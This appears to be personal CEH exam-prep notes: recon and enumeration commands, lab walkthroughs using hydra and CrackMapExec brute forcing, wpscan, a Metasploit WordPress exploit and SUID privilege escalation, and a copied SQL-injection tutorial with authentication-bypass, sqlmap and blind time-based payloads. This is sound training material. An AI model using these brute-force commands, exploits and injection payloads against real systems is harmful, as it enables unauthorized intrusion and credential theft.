retriev OS by ping TTL:
Linux + freebsd = 62 on windows / 64 on linux
Windows = 124 / 128
Cisco + solaris + aix + openbsd = 254 / 255

-----------------------------------------------------------------------------------------------------------
Google hack search:
site:compugen.com  (all sub domaines, sites...)
site:compugen.com inurl:admin
site:compugen.com inutitle:check
ite:compuge.com filetype:pdf

https://securityheaders.io/ = https://securityheaders.com/ (for security headers http/s)
https://www.ssllabs.com/ssltest/  (for certificates)

https://www.peekyou.com/hassan_aldaalooj

https://search.censys.io/hosts/72.53.93.150   (like shodan.io )

https://hexillion.com/co/DomainDossier.aspx (whois dns + net+ recods)

https://hackvertor.co.uk/urls/10 (obfuscation javascript...)

-----------------------------------------------------------------------------------------------------------

geolocalisation website: ipinfo.io or python3 billcipher.py 

curl https://ipinfo.io/162.219.226.231
curl https://ipinfo.io/$1
https://www.ipvoid.com/ip-geolocation/

loc: "40.2338,-111.6585"

or python3 billcipher.py 

nmap --script ip-geolocation-maxmind 162.241.216.11
nmap -sV --script=http-headers 10.10.6.11

-----------------------------------------------------------------------------------------------------------
-Identify windows server 2019, access it and find scan report which shows total number of directory Listing:

nmap -A 192.168.10.0/24 (should tell you OS + ports open)
nmap --open 192.168.10.144
ftp open on a server 2019 so hack
hydra -L users.txt -P password.txt ftp://192.168.10.144
ftp
open 192.168.10.144
Parker/Passw0rd@1234
cd Documents
get w_report.pdf
File explorer in /home/attacker and open w_report.pdf with LibreOffice Draw

go to /home/attacker and open it with Libre Office Draw
in the pdf search / go to Directory Listing of sensitive files sections and go to last section of it like 12.36 
and 36 the last page of the section means 36 Directory Listing of sensitive files on the website
*total number of directory Listing check title and count how mant pages Minus - the blank page with no response

-----------------------------------------------------------------------------------------------------------
-Identify attacker ip on Honeypot log file.log :

Check ip for login attempt failed + could not read /etc/user...access denied...in the log file
*The Cowrie honeypot has default credentials set to root / * (with root as username and taking any character or word for pwd)

-----------------------------------------------------------------------------------------------------------
-DDOS attack, Determine attacker ip which has transmitted more number of packets to the target machine:

Wireshark check Remote ip with Incoming bytes high and port used UDP 58777 + 5353..54866 tcp (blocked)
*Incoming bytes Outgoing bytes sometimes marked has blocked (Outgoing bytes could be 0 for some)
192.168.10.222
*port high: 54866...58777...

-----------------------------------------------------------------------------------------------------------

-Identify if website www.certifiedhacker.com allows zone transfer:

dig www.certifiedhacker.com axfr
Transfer failed

dig axfr www.certifiedhacker.com ns1.bluehost.com

nslookup
set querytype=soa
ls -d ns1.bluehost.com

-Identify website server technology www.certifiedhacker.com:
whatweb www.certifiedhacker.com
Apache

-----------------------------------------------------------------------------------------------------------
-Identify live machine in 172.16.0.0/24 via ping sweep:

nmap -sn 172.16.0.0/24 (remove -1 from the result 6 -1 = 5)
nmap -sn -PR 172.16.0.0/24 (If icmp block)
fping -a -g 172.16.0.0/24 2>/dev/null
hping3 -1 10.0.1.x --rand-dest -I eth0

-----------------------------------------------------------------------------------------------------------
-Find linux ssh server on 192.168.10.0/24:

nmap -p 22 -A 192.168.10.0/24 --open
-----------------------------------------------------------------------------------------------------------
-Find arp or mac address cooomunicating with the linux:

arp-scan -l
arp -a
-----------------------------------------------------------------------------------------------------------
-SMB enumeartion and check if message signing feature is required or not:

nmap -p 139,445 172.30.10.0/24 --open
nmap -A 172.30.10.200
(It's enabled but NOT REQUIRE !!!)

nmap --script smb2-security-mode -p 445 192.168.31.105
enum4linux -S 192.168.31.105
enum4linux -u martin -p apple -n 192.168.31.105  (-n get usernames)
enum4linux -u martin -p apple -a 192.168.31.105  (-a everything)

smbclient -L //192.168.31.105 -m SMB2
smbclient -L //192.168.31.105 -k

-----------------------------------------------------------------------------------------------------------
-Identify attack category of the oldest CVEs that affects www.goodshoping.com:

wapiti -u http://www.zobie.com   (Content Security Policy missing = XSS vulnerable)
nmap --script vuln 192.168.10.101
nmap --script vuln --script-args mincvss=6.5
nmap -sV --script vulners 192.168.31.105

search on https://nvd.nist.gov/vuln/search#/nvd/home?resultType=records

answer: Cross-Site Scripting (XSS) 
could have been = Remote Code Execution (RCE), SQL Injection (SQLI), and Server-Side Request Forgery (SSRF)
Cross-Site Request Forgery (CSRF) + OS Command Injection (RCE vector) + Code Injection (RCE)

*Try OWASP Zap scan also for cve:

-Perform vulnerability analysis using OpenVAS and find QoD percentage % of vulnerability severity as medium:
sudo su
docker run -d -p 443:443 --name openvas mikesplain/openvas
docker start openvas
https://127.0.0.1/ = admin/admin
OpenVAS Dashboards appears. Navigate to Scans --> 
Tasks from the Menu bar - click the Task Wizard option - enter the target IP
check results and you can export it for analysis on the bottom fleche du bas
QoD: 70

Try winPEAS but no result of cve:
nmap --open 172.30.10.200
hydra -L users.txt -P rockyou.txt 172.30.10.200 rdp
Administrator
Passw0rd@1234
Then use Remmina to rdp to target and download winpeas.
winPEAS.bat
-----------------------------------------------------------------------------------------------------------
#RDP perform password spraying:

cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"
cme rdp 10.10.1.0/24 -u Maurice -p "cupcake"
-----------------------------------------------------------------------------------------------------------

-Identify type of security policies is missing to detect and mitigate Cross-Site Scripting XSS & SQL injection attacks:
apt-get install wapiti
wapiti -u http://www.goodshoping.com
$firefox /root/.wapiti/generated_report/www.goodshoping.com_06092025.html
Result: CSP = Content Security Policy (to help and mitigate XSS and data injection)

-----------------------------------------------------------------------------------------------------------
-Do a bruteforce attack on www.cehorg.com = 192.168.0.222 and find password for user adam:

nmap -A 192.168.0.222 (detect WAMP SERVER on port 8080 = word press usually so browse :8080/CEH or/DVWA...)
nmap -sC -sV 192.168.0.222
nmap --open 192.168.0.222
www.cehorg.com:8080 found, wamp server with DVWA but level impossible (admin:password) and wordpress found so:

wpscan --usernames adam -P rockyou.txt --url http://192.168.0.222:8080/CEH/
orange1234

wpscan -U users.txt -P rockyou.txt --url http://192.168.0.222:8080/CEH/
wpscan --url http://192.168.0.222:8080/CEH/ --enumerate u  (u usernames)
Browse http://192.168.0.222:8080/CEH/wp-json/wp/v2/users (/wp-json/wp/v2/users/1 or /wp-json/wp/v2/users/2...401 = users & 404 = no users)
wpscan --url http://192.168.0.222:8080/CEH/ --enumerat p   (p only vulnerable plugins)
wpscan --url http://192.168.0.222:8080/CEH/ --enumerat cb  (cb for config backup)
wpscan --url http://192.168.0.222:8080/CEH/wp-login -U "admin,robert" -P rockyou.txt --password-attack xmlrpc

msfcondole
use exploit/multi/http/wp_crop_rce
set RHOSTS 192.168.0.222
set USERNAME admin
set PASSWORD cutie
run
shell
cat wp-config.php  (db user & pwd)
find / -type f -perm -u=s 2>/dev/null
*found /usr/bin/checker
/usr/bin/checker (did not get root shell so)
apt install ltrace
ltrace /usr/bin/checker
export admin=1
/usr/bin/checker

mysql -u wordpressuser -p
cutie
show databases;
use blog;
show tables;
select * from wp_users;

*You can also check http://192.168.0.222:8080/phpmyadmin/index.php
-----------------------------------------------------------------------------------------------------------
# MySQL cmd, attack...

mysql -u root -p password (localand remote below)
mysql -u root -h docker.hackthebox.eu -P 3306 -p
Enter pwd..
CREATE DATABASE users;
SHOW DATABASES;
USE users;

mysql> CREATE TABLE logins (
    ->     id INT,
    ->     username VARCHAR(100),
    ->     password VARCHAR(100),
    ->     date_of_joining DATETIME
    ->     );
Query OK, 0 rows affected (0.03 sec)

mysql> SHOW TABLES;

+-----------------+
| Tables_in_users |
+-----------------+
| logins          |
+-----------------+
1 row in set (0.00 sec)

mysql> DESCRIBE logins;

+-----------------+--------------+
| Field           | Type         |
+-----------------+--------------+
| id              | int          |
| username        | varchar(100) |
| password        | varchar(100) |
| date_of_joining | date         |
+-----------------+--------------+
4 rows in set (0.00 sec)

* PRIMARY KEY, which we can use to uniquely identify each record in the table
We can make the id column the PRIMARY KEY for this table:
PRIMARY KEY (id)

Code: sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );

mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
or
mysql> INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');

Note: The examples insert cleartext passwords into the table, for demonstration only. This is a bad practice, as passwords 
should always be hashed/encrypted before storage.

mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
mysql> SELECT * FROM logins;
----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+

mysql> SELECT username,password FROM logins;

+---------------+------------+
| username      | password   |
+---------------+------------+
| admin         | p@ssw0rd   |
| administrator | adm1n_p@ss |
| john          | john123!   |
| tom           | tom123!    |

The 'DROP' statement will permanently and completely delete the table with no confirmation, so it should be used with caution.

mysql> DROP TABLE logins;

Query OK, 0 rows affected (0.01 sec)

mysql> SHOW TABLES;

Empty set (0.00 sec)

We can use ALTER to change the name of any table and any of its fields or to delete or add a new column to an existing table. 
The below example adds a new column newColumn to the logins table using ADD:

mysql> ALTER TABLE logins ADD newColumn INT;
mysql> ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
mysql> ALTER TABLE logins MODIFY newerColumn DATE;
mysql> ALTER TABLE logins DROP newerColumn;

We can use any of the above statements with any existing table, as long as we have enough privileges to do so.

While ALTER is used to change a table's properties, the UPDATE statement can be used to update specific records within a table

Code: sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;
mysql> SELECT * FROM logins;

+----+---------------+-----------------+---------------------+
| id | username      | password        | date_of_joining     |
+----+---------------+-----------------+---------------------+
|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
|  2 | administrator | change_password | 2020-07-02 11:30:50 |
|  3 | john          | change_password | 2020-07-02 11:47:16 |
|  4 | tom           | change_password | 2020-07-02 11:47:16 |

*The query above updated all passwords in all records where the id was more significant than 1.

#Sorting Results
We can sort the results of any query using ORDER BY and specifying the column to sort by:

mysql> SELECT * FROM logins ORDER BY password;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+

By default, the sort is done in ascending order, but we can also sort the results by ASC or DESC:

mysql> SELECT * FROM logins ORDER BY password DESC;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |

mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;

*we can LIMIT the results to what we want only, using LIMIT and the number of records we want:

mysql> SELECT * FROM logins LIMIT 2;

*To filter or search for specific data, we can use conditions with the SELECT statement using the WHERE clause, to fine-tune the results:

mysql> SELECT * FROM logins WHERE id > 1;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |

mysql> SELECT * FROM logins where username = 'admin';

* LIKE, enabling selecting records by matching a certain pattern.

mysql> SELECT * FROM logins WHERE username LIKE 'admin%';

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |

*the _ symbol is used to match exactly one character. The below query matches all usernames with exactly three characters

mysql> SELECT * FROM logins WHERE username like '___';

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |

MariaDB [employees]> select * FROM employees WHERE first_name LIKE'Bar%' AND hire_date = '1990-01-01';
+--------+------------+------------+-----------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  |
+--------+------------+------------+-----------+--------+------------+
|  10227 | 1953-10-09 | Barton     | Mitchem   | M      | 1990-01-01 |
+--------+------------+------------+-----------+--------+------------+

*The AND operator takes in two conditions and returns true or false based on their evaluation:

condition1 AND condition2
The result of the AND operation is true if and only if both condition1 and condition2 evaluate to true:
mysql> SELECT 1 = 1 AND 'test' = 'test';

+---------------------------+
| 1 = 1 AND 'test' = 'test' |
+---------------------------+
|                         1 |

mysql> SELECT 1 = 1 AND 'test' = 'abc';

+--------------------------+
| 1 = 1 AND 'test' = 'abc' |
+--------------------------+
|                        0 |

*The OR operator takes in two expressions as well, and returns true when at least one of them evaluates to true:

mysql> SELECT 1 = 1 OR 'test' = 'abc';

+-------------------------+
| 1 = 1 OR 'test' = 'abc' |
+-------------------------+
|                       1 |

mysql> SELECT 1 = 2 OR 'test' = 'abc';

+-------------------------+
| 1 = 2 OR 'test' = 'abc' |
+-------------------------+
|                       0 |

*The NOT operator simply toggles a boolean value 'i.e. true is converted to false and vice versa':

mysql> SELECT NOT 1 = 1;

+-----------+
| NOT 1 = 1 |
+-----------+
|         0 |

mysql> SELECT NOT 1 = 2;

+-----------+
| NOT 1 = 2 |
+-----------+
|         1 |

As seen in the examples above, the first query resulted in false because it is the inverse of the evaluation of 1 = 1, which is true
so its inverse is false. On the other hand, the second query returned true, as the inverse of 1 = 2 'which is false' is true.

The AND, OR and NOT operators can also be represented as && (AND), || (OR) and ! (NOT), respectively, by using the symbol operators:

mysql> SELECT 1 = 1 && 'test' = 'abc';
mysql> SELECT 1 = 1 || 'test' = 'abc';
mysql> SELECT 1 != 1;
mysql> SELECT * FROM logins WHERE username != 'john';
mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1;

*Here is a list of common operations and their precedence
Division (/), Multiplication (*), and Modulus (%)
Addition (+) and subtraction (-)
Comparison (=, >, <, <=, >=, !=, LIKE)
NOT (!)
AND (&&)
OR (||)
<> = not equla to xxx

mysql> select * from logins where username != 'tom' AND id > 3 - 2;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-03 12:03:53 |
|  3 | john          | john123!   | 2020-07-03 12:03:57 

MariaDB [employees]> show tables;
MariaDB [employees]> select * from titles;
MariaDB [employees]> SELECT * FROM titles WHERE emp_no > 1000 AND titles <> 'engineer';
MariaDB [employees]> SELECT * FROM titles WHERE emp_no > 1000 AND titles != 'engineer';

#MySQL webapp connection / interaction:

Code: php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);

*Then, the query's output will be stored in $result, and we can print it to the page or use it in any other way.
The below PHP code will print all returned results of the SQL query in new lines:

Code: php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}

*Web applications also usually use user-input when retrieving data. For example, when a user uses the search function to search for other
users, their search input is passed to the web application, which uses the input to search within the databases:

Code: php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);

*If we use user-input within an SQL query, and if not securely coded, it cause a variety of issues, like SQL Injection vulnerabilities.

Sanitization refers to the removal of any special characters in user-input, in order to break any injection attempts.

-What is an Injection?
*In the above example, we accept user input and pass it directly to the SQL query without sanitization.

Injection occurs when an application misinterprets user input as actual code rather than a string, changing the code flow and executing it
This can occur by escaping user-input bounds by injecting a special character like ('), and then writing code to be executed, 
like JavaScript code or SQL in SQL Injections. Unless the user input is sanitized, it is likely to execute the injected code and run it.

-SQL Injection
*An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input. 
The previous example showed how user-input can be used within an SQL query, and it did not use any form of input sanitization:

Code: php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);

In typical cases, the searchInput would be inputted to complete the query, returning the expected outcome. 
Any input we type goes into the following SQL query:

Code: sql
select * from logins where username like '%$searchInput'

So, if we input admin, it becomes '%admin'. In this case, if we write any SQL code, it would just be considered as a search term. 
For example, if we input SHOW DATABASES;, it would be executed as '%SHOW DATABASES;' The web application will search for usernames 
similar to SHOW DATABASES;. However, as there is no sanitization, in this case, we can add a single quote ('), 
which will end the user-input field, and after it, we can write actual SQL code. For example, if we search for 1'; DROP TABLE users;, 
the search input would be:

Code: php
'%1'; DROP TABLE users;'

*Notice how we added a single quote (') after "1", in order to escape the bounds of the user-input in ('%$searchInput').

So, the final SQL query executed would be as follows:

Code: sql
select * from logins where username like '%1'; DROP TABLE users;'

As we can see from the syntax highlighting, we can escape the original query's bounds and have our newly injected query execute as well. Once the query is run, the users table will get deleted.

Note: In the above example, for the sake of simplicity, we added another SQL query after a semi-colon (;). 
Though this is actually not possible with MySQL, it is possible with MSSQL and PostgreSQL
In the coming sections, we'll discuss the real methods of injecting SQL queries in MySQL.

*Syntax Errors
The previous example of SQL injection would return an error:

Code: php
Error: near line 1: near "'": syntax error

This is because of the last trailing character, where we have a single extra quote (') that is not closed, which causes a SQL syntax error when executed:

Code: sql
select * from logins where username like '%1'; DROP TABLE users;'

In this case, we had only one trailing character, as our input from the search query was near the end of the SQL query. However, 
the user input usually goes in the middle of the SQL query, and the rest of the original SQL query comes after it.

To have a successful injection, we must ensure that the newly modified SQL query is still valid and does not have any syntax errors after 
our injection. In most cases, we would not have access to the source code to find the original SQL query and develop a proper SQL injection 
to make a valid SQL query. So, how would we be able to inject into the SQL query then successfully?

One answer is by using comments, and we will discuss this in a later section. Another is to make the query syntax work by passing 
in multiple single quotes, as we will discuss next (').

In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it.
This is known as In-band SQL injection, and it has two types: Union Based and Error Based.

With Union Based SQL injection, we may have to specify the exact location, 'i.e., column', which we can read, so the query 
will direct the output to be printed there. As for Error Based SQL injection, it is used when we can get the PHP or SQL errors 
in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.

In more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character. 
This is known as Blind SQL injection, and it also has two types: Boolean Based and Time Based.

With Boolean Based SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, 
'i.e., original query response,' if our conditional statement returns true. As for Time Based SQL injections, 
we use SQL conditional statements that delay the page response if the conditional statement returns true using the Sleep() function.

Finally, in some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 
'i.e., DNS record,' and then attempt to retrieve it from there. This is known as Out-of-band SQL injection.

In this module, we will only be focusing on introducing SQL injections through learning about Union Based SQL injection.

-Authentification Bypass Example: Web page login / password

Code: sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';

The page takes in the credentials, then uses the AND operator to select records matching the given username and password. 
If the MySQL db returns matched records, the credentials are valid, so the PHP code would evaluate the login attempt condition as true. 
If the condition evaluates to true, the admin record is returned, and our login is validated. 
Let us see what happens when we enter incorrect credentials.

*As expected, the login failed due to the wrong password leading to a false result from the AND operation.

SQLi Discovery
Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test 
whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username 
and see if it causes any errors or changes how the page behaves:

Payload	URL Encoded
'	%27
"	%22
#	%23
;	%3B
)	%29

Note: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly 
in the URL 'i.e. HTTP GET request'.

*So, let us start by injecting a single quote:

Code: sql
SELECT * FROM logins WHERE username=''' AND password = 'something';

*We see that a SQL error was thrown instead of the Login Failed message. The page threw an error because the resulting query above.

As discussed in the previous section, the quote we entered resulted in an odd number of quotes, causing a syntax error. 
One option would be to comment out the rest of the query and write the remainder of the query as part of our injection 
to form a working query. Another option is to use an even number of quotes within our injected query, 
such that the final query would still work.

*OR Injection:

We would need the query always to return true, regardless of the username and password entered, to bypass the authentication. 
To do this, we can abuse the OR operator in our SQL injection.

 for operation precedence states that the AND operator would be evaluated before the OR operator. This means that if there is at least one
TRUE condition in the entire query along with an OR operator, the entire query will evaluate to TRUE since the OR operator returns TRUE 
if one of its operands is TRUE.

An example of a condition that will always return true is '1'='1'. but, to keep the SQL query working and keep an even number of quotes, 
instead of using ('1'='1'), we will remove the last quote and use ('1'='1), so the remaining single quote from the original query 
would be in its place.

So, if we inject the below condition and have an OR operator between it and the original condition, it should always return true:

Code: sql
admin' or '1'='1

The final query should be as follow:

Code: sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';

This means the following:

If username is admin
OR
If 1=1 return true 'which always returns true'
AND
If password is something

*The AND operator will be evaluated first, and it will return false. Then, the OR operator would be evaluated, and if either 
of the statements is true, it would return true. Since 1=1 always returns true, this query will return true, and it will grant us access.

Note: The payload we used above is one of many auth bypass payloads we can use to subvert the authentication logic. 
You can find a comprehensive list of SQLi auth bypass payloads in PayloadAllTheThings, each of which works on a certain type of SQL queries.

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

*Auth Bypass with OR operator

Let us try this as the username and see the response.

SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';

*We were able to log in successfully as admin. However, what if we did not know a valid username? 

Let us try the same request with a different username this time.

SELECT * FROM logins WHERE username='NotAdmin' or '1'='1' AND password = 'something';

*The login failed because notAdmin does not exist in the table and resulted in a false query overall.

To successfully log in once again, we will need an overall true query. This can be achieved by injecting an OR condition into the password
field, so it will always return true. Let us try something' or '1'='1 as the password.

SELECT * FROM logins WHERE username='NotAdmin' or '1'='1' AND password = 'something' or '1'='1';

The additional OR condition resulted in a true query overall, as the WHERE clause returns everything in the table, and the user present 
in the first row is logged in. In this case, as both conditions will return true, we do not have to provide a test username and password 
and can directly start with the ' injection and log in with just ' or '1' = '1.

SELECT * FROM logins WHERE username=" or '1'='1' AND password = " or '1'='1';

*This works since the query evaluate to true irrespective of the username or password.

-Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?

login = tom' or '1'='1
password = nothing only in login

tom')-- -

# Using Comments

How to use comments to subvert the logic of more advanced SQL queries and end up with a working SQL query to bypass the login 
authentication process.

-Comments
Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part 
of the query. We can use two types of line comments with MySQL -- and #, in addition to an in-line comment /**/ 
(though this is not usually used in SQL injections). The -- can be used as follows:

mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom      

Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, 
so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), 
as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.

The # symbol can be used as well.

mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00

Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, 
and will not be passed as part of the URL.
In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.

*The server will ignore the part of the query with AND password = 'something' during evaluation.

# Auth Bypass with comments
Let us go back to our previous example and inject admin'-- as our username. The final query will be:

Code: sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';

As we can see from the syntax highlighting, the username is now admin, and the remainder of the query is now ignored as a comment. 
Also, this way, we can ensure that the query does not have any syntax issues.

Let us try using these on the login page, and log in with the username admin'-- and anything as the password:

SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';

*As we see, we were able to bypass the authentication, as the new modified query checks for the username, with no other conditions.

Another Example
SQL supports the usage of parenthesis if the application needs to check for particular conditions before others. 
Expressions within the parenthesis take precedence over other operators and are evaluated first

SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = '437bxxxxxxxxx';
FAILED

The above query ensures that the user's id is always greater than 1, which will prevent anyone from logging in as admin. 
Additionally, we also see that the password was hashed before being used in the query. This will prevent us from injecting 
through the password field because the input is changed to a hash.

Let us try logging in with valid credentials admin / p@ssw0rd to see the response.

SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = '0f35xxxxxxxxx';
FAILED

*As expected, the login failed even though we supplied valid credentials because the admin’s ID equals 1. 
So let us try logging in with the credentials of another user, such as tom.

SELECT * FROM logins WHERE (username='tom' AND id > 1) AND password = '0f35xxxxxxxxx';

Logging in as the user with an id not equal to 1 was successful. So, how can we log in as the admin? We know from the previous section 
on comments that we can use them to comment out the rest of the query. So, let us try using admin'-- as the username.

SELECT * FROM logins WHERE (username='admin'--' AND id > 1) AND password = '0f35xxxxxxxxx';
FAILED

*The login failed due to a syntax error, as a closed one did not balance the open parenthesis. To execute the query successfully,
we will have to add a closing parenthesis. Let us try using the username admin')-- to close and comment out the rest.

SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password = '437bxxxxxxxxx';
GOOD

The query was successful, and we logged in as admin. The final query as a result of our input is:

SELECT * FROM logins where (username='admin')
The query above is like the one from the previous example and returns the row containing admin.

*Login as the user with the id 5 to get the flagl

SELECT * FROM logins WHERE (username='NotAdmin' or '1'='1' AND id > 4) AND password = 'something' or '1'='1';

-----------------------------------------------------------------------------------------------------------
-Search in CWE list quick access on the 2023 CWE Top 25 most dangerous weakness ID of the last entry:
https://cwe.mitre.org/ + https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html
*ID lookup top right to search by Weakness ID
*list and find the top weakness in the list “Weaknesses in the 2023 CWE Top 25 Most Dangerous Software Weakness.
-Identify name of Weakness ID: 276
Incorrect Default Permissions

-----------------------------------------------------------------------------------------------------------
-find smtp server on 172.30.10.0/24:

nmap -p 25 172.30.10.0/24 --open

nmap -p 25,587,465 --open 172.30.10.0/24
masscan 192.168.0.0/24 -p 25,587,465 --rate 1000
smtp-user-enum -M VRFY -U userlist.txt -t 172.30.10.200
telnet 172.30.10.200 (check smtp banner)
172.30.10.200

nmap -p 25 --script smtp-open-relay 172.30.10.114
nmap -p 25 --script smtp-commands 172.30.10.114
-----------------------------------------------------------------------------------------------------------

-DNS enumeration on certifiedhacker.com to find the name servers used by the domain:

dig ns certifiedhacker.com (ns1.bluehost.com, ns2bluehost.com)
host certifiedhacker.com
host certifiedhacker.com 8.8.8.8

dig NS certifiedhacker.com / dig theforce.net ANY +noall +answer
nslookup -type=NS certifiedhacker.com
dnsrecon -d certifiedhacker.com

nslookup
set type=a
www.certifiedhacker.com

Non-authoritative answer:
Name:    certifiedhacker.com
Address:  162.241.216.11
Aliases:  www.certifiedhacker.com

> set type=ns
> www.certifiedhacker.com

Non-authoritative answer:
www.certifiedhacker.com canonical name = certifiedhacker.com
certifiedhacker.com     nameserver = ns1.bluehost.com
certifiedhacker.com     nameserver = ns2.bluehost.com

-----------------------------------------------------------------------------------------------------------
-find ip domain controller on 10.10.10.0/24: + NetBIOS_Domain_Name 

nmap -A -p 389 --open 192.168.0.0/24
nmap -p 88 -sV 192.168.0.0/24 (Domain Controller) 
nmap -A -sC -sV 192.168.0.222 (NetBIOS_Domain_Name) = SKILL.CEH

DNS Tree Name result from above nmap:

SKILL.CEH.com

nslookup
set type=SRV
_ldap._tcp.dc._msdcs.ceh.com
or
nmap -p 88,389,636,3268 --open 10.10.10.0/24
-----------------------------------------------------------------------------------------------------------

-perform host discovery scanning and identify NETBIOS name of 10.10.10.25   Format : AAAAA.AAA or SNMP check
nmap -A 192.168.0.222
nmap -p 88 -sC -sV 192.168.0.222
SKILL.CEH

nmap -p 139,445 --script nbstat -T4 192.168.31.105
nbtstat -a 192.168.31.105
net view \\192.168.31.105 /ALL
net view /domain:ad.init

snmpwalk -v2c -c public 192.168.31.105
snmp-check 192.168.31.12 

-Find out DNS_Tree_Name of 192.168.0.222:
nmap -A -sC -sV 192.168.0.222
SKILL.CEH.COM

-----------------------------------------------------------------------------------------------------------

-Find ip of NFS server and port 21 (ftp):
nmap -p 21,2049 10.10.10.0/24
nmap -p 111 10.10.10.0/24

apt install nfs-common = client 
showmount -e 10.10.10.25

-----------------------------------------------------------------------------------------------------------

-Find SSH server vulnerable version and identify versions of actual openSSH + OS:
nmap -p 22 -sV --open 192.168.10.0/24

-determine machine OS of MySQL server on 172.30.10.0/24 :
nmap -p 3306 --open 172.30.10.0/24
once ip found
nmap -A 172.30.10.99  (port 80 shows Apache Ubuntu)
Ubuntu

nmap -p 22 --script ssh-hostkey 172.30.10.99

-----------------------------------------------------------------------------------------------------------
-Scan 192.168.10.0/24 find IP os MSSQL / SQL server:

nmap -p 1433 192.168.10.0/24 --open

-------------------------------------------------------------------------------------------------------------

-website might be vulnerable to blind sql injection with MySql determine machine OS on it ?:
*OWASP* or try below
sqlmap -u "http://target.com/page?id=1" --technique=B --risk=3 --level=5
http://target.com/page?id=1 AND SLEEP(5)
If the page takes longer to load (e.g., 5 seconds), the site is likely vulnerable to SQL injection. You can use boolean-based payloads like:
http://target.com/page?id=1 AND 1=1
http://target.com/page?id=1 AND 1=2

nmap -sV -p 80,443 target.com
curl -I http://target.com
nikto -h http://target.com -o result -F txt
